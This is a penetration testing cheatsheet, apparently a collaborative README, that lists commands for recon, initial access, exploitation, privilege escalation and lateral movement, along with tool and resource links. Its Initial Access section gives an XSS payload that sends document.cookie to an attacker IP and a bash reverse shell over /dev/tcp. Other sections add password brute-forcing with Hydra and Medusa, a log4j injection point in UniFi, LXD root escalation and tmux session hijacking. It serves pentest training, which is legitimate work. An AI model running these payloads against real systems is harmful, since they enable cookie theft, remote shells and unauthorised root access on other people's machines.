# PENETRATION TESTING CHEATSHEET
A collaborative project to create a cheatsheet for useful commands / tools / resources for the use of penetration testing

## COMMANDS
This section is for useful commands to run with various tools for pentesting.

### Misc

<details>
  <summary> IP to Host Association </summary>


- Associate IP with Hostname : `sudo nano /etc/hosts` > Add: `<IP Address> <Domain>`

</details>


<details>
  <summary> rlwrap </summary>


 - rlwrap, software to get interactive shell when attacking a machine. Allows you to use arrow keys on target machine: 
 - to install: `sudo apt install rlwrap`
 - to use, run rlwrap before netcat: `rlwrap nc -tlvp 8080`

</details>

### Enumeration

<details>
  <summary> NMAP </summary>


- scan with default scripts and version detection on the 1000 most common ports : `sudo nmap -sC -sV <ip_address>`

</details>


<details>
  <summary> SMBclient </summary>


- Lists shares on a specified server : `smbclient -L //<server_address>`
- Connect to shares without user password prompt: `smbclient -N \\\\<server_address>\\<share_name_no_$>`

</details>


<details>
  <summary> Nikto </summary>


- Comprehensive webserver Scanner : `nikto http://<server_address>`

</details>


<details>
  <summary> Dirsearch </summary>


- Directory scanner : `dirsearch -u <server_address>`

</details>


### Initial Access 

<details>
  <summary> Cookie Snatcher </summary>


`<img src=x onerror=fetch('http://<YourIP>/?c='+document.cookie);>`

Note: Can be used with burp suite by changing User Agent and exploitable field to the above and listening on Netcat to catch cookies sent back

</details>


<details>
  <summary> Simple Bash </summary>


`bash -c 'bash -i >& /dev/tcp/<Local IP>/<Local Port> 0>&1'`


</details>


<details>
  <summary> Stable Shell </summary>


`script /dev/null -c /bin/bash` -- if there is no python installed

`python3 -c 'import pty;pty.spawn("/bin/bash")'`

`export TERM=xterm`

`stty raw -echo; fg`


</details>


<details>
  <summary> Password Cracking </summary>


Medusa: `medusa -h <Hostname/IP> -u <User> -P <Password list> -M <Service>`

Hydra:  `hydra -L <User/User list> -P <Password list> ssh://<target_ip>`

Wordpress Password: `wpscan â€”url <URL> -U <User/User list> -P <Password list>`


</details>


### Exploitation

<details>
  <summary> log4j on unifi </summary>

Link: https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi

- unifi versions prior to 6.5.54 are vulnerable to remote code execution.
- The vulnerability is in the remember (or in some versions the username) value issued in the login request shown below:
`POST /api/login HTTP/2`
`Host: <TARGET>` 
`Content-Length: 109`
...
...
`Referer: https://<TARGET>/manage/account/login?redirect=%2Fmanage`
`Accept-Encoding: gzip, deflate`
`Accept-Language: en-US,en;q=0.9`

`{"username":"asdf","password":"asdfas","remember":"<PAYLOAD>","strict":true}`

</details>


### Internal Recon / Privelege Escalation


### Persistence


### Lateral Movement

<details>
  <summary> group:LXD </summary>


 - link: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
 - if user is in LXD group when command `id` is used

  - Summary:
  - install https://github.com/lxc/distrobuilder
  - build alpine lxd image and upload to target machine (upload lxd.tar.xz and rootfs.squashfs)
  - in target machine, add image to repo and create container (`security.privileged=true` when creating container)
  - execute container to get root:
    `lxc start privesc`
    `lxc exec privesc /bin/sh`
  - user:~# `cd /mnt/root` #Here is where the filesystem is mounted


<details>

<details>
  <summary> tmux session hijacking </summary>

 
 - if root is running tmux process and user has read/write access to "/tmp/dev_sess"
 - link: https://int0x33.medium.com/day-69-hijacking-tmux-sessions-2-priv-esc-f05893c4ded0
 - `tmux -S /tmp/dev_sess attach -t 0` #Attach using a non-default tmux socket


<details>

## TOOLS


### Enumeration


- **RUSTSCAN**
<https://github.com/RustScan/RustScan>
A faster port scanning tool, programmed in Rust for :fire:blazingly:fire: fast performance.

- **Auto Recon**
<https://github.com/Tib3rius/AutoRecon>
Multi-Threaded network recon suite.
  
- **DirBuster**
<https://www.kali.org/tools/dirbuster/>
Brute force directories and files names on web/application servers.

### Exploitation


### Internal Recon / Privilege Escalation
- **Lin/Win Peas**
<https://github.com/peass-ng/PEASS-ng/>
Y'all know what this does

### Persistence


### Lateral Movement

### Digital Forensics

- **VOLATILITY3**
<https://github.com/volatilityfoundation/volatility3>
Data extraction from Memory dump <br>
Associated cheatsheet here: <https://blog.onfvp.com/post/volatility-cheatsheet/>

- **Eric Zimmerman's Forensic Suite**
<https://ericzimmerman.github.io/#!index.md>
Forensic suite for Windows DFIR tools

## RESOURCES

### Enumeration


### Exploitation


### Internal Recon / Privilege Escalation

- [Linux Privilege Escalation Cheatsheet](https://medium.com/@kidnapshadow/linux-privilege-escalation-cheatsheet-from-tryhackme-kidnapshadow-sidharth-1e1a339419d2)
- [GTFO Bin](https://gtfobins.github.io/)
- [Linux Privilege Escalation with wildcard *](https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa)


### Persistence

### Lateral Movement

